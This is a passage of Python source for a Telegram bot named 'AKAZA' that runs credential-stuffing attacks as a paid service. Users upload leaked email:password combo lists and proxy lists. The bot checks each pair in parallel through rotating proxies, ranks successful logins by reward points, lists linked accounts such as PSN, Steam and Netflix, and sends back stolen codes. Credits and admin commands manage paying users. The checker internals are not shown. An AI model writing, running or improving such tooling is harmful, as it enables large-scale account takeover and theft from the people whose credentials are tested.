    if not akaza_db.has_access(u.effective_user.id): return
    if u.message.document:
        f = await c.bot.get_file(u.message.document.file_id); content = (await f.download_as_bytearray()).decode('utf-8')
        global PROXIES; PROXIES = [l.strip() for l in content.split('\n') if l.strip() and ':' in l]
        await u.message.reply_text(f"✅ Loaded `{len(PROXIES)}` proxies.")

async def bot_handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    if akaza_db.is_banned(uid) or not akaza_db.has_access(uid):
        return

    if u.message.document:
        f = await c.bot.get_file(u.message.document.file_id)
        text = (await f.download_as_bytearray()).decode('utf-8')
    else:
        text = u.message.text

    lines = [l.strip() for l in text.split('\n') if ':' in l]
    if not lines:
        return

    creds = akaza_db.get_credits(uid)
    if uid != ADMIN_ID and creds < len(lines):
        await u.message.reply_text(f"❌ Need {len(lines)} credits, have {creds}.")
        return

    settings = akaza_db.get_user_settings(uid)
    max_threads = min(settings['threads'] if PROXIES else 5, 300)
    status_msg = await u.message.reply_text("🔄 **Engine Starting...**", parse_mode='Markdown')

    hits, bad, tfa, checked = 0, 0, 0, 0
    start_time = time.time()
    results_file = f"hits_{uid}.txt"
    update_lock = asyncio.Lock()
    last_update = 0

    def run_check(line):
        try:
            e, p = line.split(':', 1)
            ch = SupremeBotChecker(random.choice(PROXIES) if PROXIES else None)
            return {'e': e.strip(), 'p': p.strip(), 'res': ch.check(e.strip(), p.strip())}
        except:
            return None

    loop = asyncio.get_running_loop()
    semaphore = asyncio.Semaphore(max_threads)

    async def worker(line):
        nonlocal hits, bad, tfa, checked, last_update
        async with global_semaphore:
            async with semaphore:
                data = await loop.run_in_executor(executor, run_check, line)
                if not data: return
                e, p, res = data['e'], data['p'], data['res']
                checked += 1
                akaza_db.save_result(uid, e, res['status'], res)
                akaza_db.use_credit(uid)

                if res['status'] == 'hit':
                    hits += 1
                    d = res['det']
                    tier = "🎯 HIT"
                    if d['pts'] >= 20000: tier = "💎 ULTRA HIT"
                    elif d['pts'] >= 7000: tier = "⭐ PREMIUM HIT"
                    cap = f"🌍 Country: {d['country']}\n💰 Points: {d['pts']}\n"
                    if d['codes']: cap += f"🎁 Codes: {', '.join(d['codes'][:3])}\n"
                    srv = [f"{k.upper()}" for k in ['psn', 'steam', 'minecraft', 'tiktok', 'supercell', 'instagram', 'facebook', 'netflix', 'epic'] if 'Yes' in str(d.get(k, ""))]
                    if srv: cap += f"🎮 Services: {', '.join(srv)}\n"
                    ht = f"**{tier}**\n📧 `{e}:{p}`\n{cap}"
                    try:
                        await c.bot.send_message(uid, ht, parse_mode='Markdown')
                    except:
                        pass
                    with open(results_file, 'a') as f:
                        f.write(f"{e}:{p} | {json.dumps(d)}\n")
                elif res['status'] == '2fa':
                    tfa += 1
                else:
                    bad += 1

                async with update_lock:
                    now = time.time()
                    if now - last_update > 2.0 or checked == len(lines):
                        last_update = now
                        el = now - start_time
                        cpm = int((checked / el) * 60) if el > 0 else 0
                        prg = (f"🔄 **AKAZA Engine**\n📊 Progress: `{checked}/{len(lines)}`\n🎯 Hits: `{hits}` | 💀 Bad: `{bad}`\n🔒 2FA: `{tfa}` | ⚡️ CPM: `{cpm}`")
                        try:
                            await status_msg.edit_text(prg, parse_mode='Markdown')
                        except:
                            pass
    await asyncio.gather(*(worker(l) for l in lines))
    if os.path.exists(results_file):
        with open(results_file, 'rb') as f: await u.message.reply_document(f, caption=f"✅ Done! Hits: {hits}"); os.remove(results_file)
    else: await u.message.reply_text("✅ Done! No hits.")

async def bot_admin_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    if not akaza_db.is_mod(uid):
        return
    txt = u.message.text
    if not txt.startswith('!!'):
        return
    try:
        p = txt.split()
        cmd = p[0][2:].lower()
        if cmd == "help":
            h = ("**Admin Commands:**\n"
                 "!!addcredits [uid] [amt]\n"
                 "!!ban [uid]\n"
                 "!!unban [uid]\n"
                 "!!grant [uid] [amt]\n"
                 "!!revoke [uid]\n"
                 "!!mod [uid]\n"
                 "!!unmod [uid]\n"
                 "!!broadcast [msg]\n"
                 "!!stats\n"
                 "!!info [uid]")
            await u.message.reply_text(h, parse_mode='Markdown')
        elif cmd == "addcredits" and len(p) == 3:
            akaza_db.add_credits(int(p[1]), int(p[2]))
            await u.message.reply_text("✅ Credits added.")
        elif cmd == "ban" and len(p) == 2:
            akaza_db.set_ban(int(p[1]), 1)
            await u.message.reply_text("🚫 User banned.")
        elif cmd == "unban" and len(p) == 2:
            akaza_db.set_ban(int(p[1]), 0)
            await u.message.reply_text("✅ User unbanned.")
        elif cmd == "grant" and len(p) == 3:
            akaza_db.grant(int(p[1]), int(p[2]))
            await u.message.reply_text("💎 Access granted.")
        elif cmd == "revoke" and len(p) == 2:
            akaza_db.revoke(int(p[1]))
            await u.message.reply_text("❌ Access revoked.")
        elif cmd == "mod" and uid == ADMIN_ID and len(p) == 2:
            akaza_db.set_mod(int(p[1]), 1)
            await u.message.reply_text("🛠 Moderator added.")
        elif cmd == "unmod" and uid == ADMIN_ID and len(p) == 2:
            akaza_db.set_mod(int(p[1]), 0)
            await u.message.reply_text("🗑 Moderator removed.")
        elif cmd == "stats":
            s = akaza_db.get_stats()
            await u.message.reply_text(f"📊 **Global Stats**\nUsers: {s['total']}\nChecks: {s['checks']}\nHits: {s['hits']}", parse_mode='Markdown')
        elif cmd == "info" and len(p) == 2:
            u_info = akaza_db.get_user(int(p[1]))
            if u_info:
                await u.message.reply_text(f"👤 **User Info**\nID: `{u_info[0]}`\nCredits: {u_info[4]}\nAccess: {'Yes' if u_info[3] else 'No'}\nMod: {'Yes' if u_info[9] else 'No'}", parse_mode='Markdown')
        elif cmd == "setcpm" and uid == ADMIN_ID and len(p) == 2:
            global global_semaphore
            global_semaphore = asyncio.Semaphore(int(p[1]))
            await u.message.reply_text(f"⚡ Global CPM limit set to {p[1]}.")
        elif cmd == "reset" and len(p) == 2:
            target = int(p[1])
            with db_lock:
                conn = sqlite3.connect(DB_PATH); c = conn.cursor()
                c.execute("UPDATE users SET total_checks=0, total_hits=0 WHERE user_id=?", (target,))
                conn.commit(); conn.close()
            await u.message.reply_text("♻️ User stats reset.")
        elif cmd == "broadcast" and len(p) > 1:
            msg = " ".join(p[1:])
            await u.message.reply_text(f"📢 Broadcast: {msg}")
    except Exception as e:
        await u.message.reply_text(f"❌ Error: {e}")

async def bot_cb_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
    q = u.callback_query; uid = q.from_user.id; await q.answer()
    if q.data == "settings": await q.edit_message_text(f"⚙️ Settings\nUse /threads [1-300]", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))
    elif q.data == "back": await bot_start(u, c)
    elif q.data == "stats":
        u_info = akaza_db.get_user(uid)
        s = (f"📊 **User Stats**\n"
             f"ID: `{uid}`\n"
             f"Credits: `{akaza_db.get_credits(uid)}`\n"
             f"Total Checks: `{u_info[5]}`\n"
             f"Total Hits: `{u_info[6]}`\n"
             f"Status: `{'Admin' if uid == ADMIN_ID else ('Moderator' if u_info[9] else 'User')}`")
        await q.edit_message_text(s, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))

async def bot_set_threads(u: Update, c: ContextTypes.DEFAULT_TYPE):
    try:
        t = int(c.args[0])
        if 1 <= t <= 300:
            akaza_db.update_settings(u.effective_user.id, threads=t)
            await u.message.reply_text("✅ Done")
    except:
        pass

def final_bot_main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", bot_start)); app.add_handler(CommandHandler("threads", bot_set_threads)); app.add_handler(CallbackQueryHandler(bot_cb_handler))
    app.add_handler(MessageHandler(filters.TEXT & filters.Regex(r'^!!'), bot_admin_handler))
    app.add_handler(MessageHandler(filters.Document.FileExtension("txt") & filters.Caption(filters.Regex(re.compile(r'prox', re.I))), bot_handle_proxies))
    app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), bot_handle_combo))
    app.add_handler(MessageHandler(filters.TEXT & filters.Regex(r':'), bot_handle_combo))
    app.run_polling()

if __name__ == "__main__":
    final_bot_main()
